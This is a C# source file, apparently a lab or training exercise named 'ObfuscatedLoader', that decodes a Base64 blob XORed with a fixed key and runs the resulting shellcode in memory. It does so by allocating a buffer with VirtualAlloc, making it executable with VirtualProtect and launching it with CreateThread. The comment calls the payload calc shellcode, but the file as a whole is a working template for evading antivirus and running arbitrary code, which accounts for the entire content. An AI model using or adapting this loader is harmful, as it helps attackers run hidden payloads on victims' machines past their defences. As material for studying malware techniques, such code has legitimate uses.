using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace A03_4_ObfuscatedLoader
{
    class Program
    {
        // --- P/Invoke Signatures ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // --- Constants ---
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint INFINITE = 0xFFFFFFFF;

        static byte[] XorTransform(byte[] data, byte key)
        {
            byte[] output = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) { output[i] = (byte)(data[i] ^ key); }
            return output;
        }

        static void Main(string[] args)
        {
            byte xorKey = 0x5A;
            // This is the Base64 representation of your x64 calc shellcode XOR'd with 0x5A
            string embeddedBlob = "SINK7CgoSDE99mXoSL92GBhIvzAwSDE2SDE2SDEuEIs9PChIAeiLgIgAAABIAnrkRIuYGBRIu2ggSUEB7USLeCRIUQHtRIt4HBRIAe1I/+xD9zylBaU0IiwSHeEBIAnowSAdIAnrwSAnIEAABIAnoski9mXoRUi7amNhbGMuZXhlUkiJ4boBAAAAf9BIg8REOMM=";

            byte[] encoded = Convert.FromBase64String(embeddedBlob);
            byte[] decoded = XorTransform(encoded, xorKey);

            // 1. Allocate buffer (Read/Write)
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)decoded.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // 2. Copy the decoded shellcode to memory
            Marshal.Copy(decoded, 0, mem, decoded.Length);
            Console.WriteLine("[*] Payload de-obfuscated and staged.");

            // 3. Change protection to Execute/Read (Critical for DEP)
            uint oldProtect;
            VirtualProtect(mem, (UIntPtr)decoded.Length, PAGE_EXECUTE_READ, out oldProtect);
            Console.WriteLine("[*] Memory protection set to Execute.");

            // 4. Execute the thread at the 'mem' location
            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out threadId);

            if (hThread != IntPtr.Zero)
            {
                Console.WriteLine("[*] Shellcode thread launched. Waiting...");
                WaitForSingleObject(hThread, INFINITE);
            }
        }
    }
}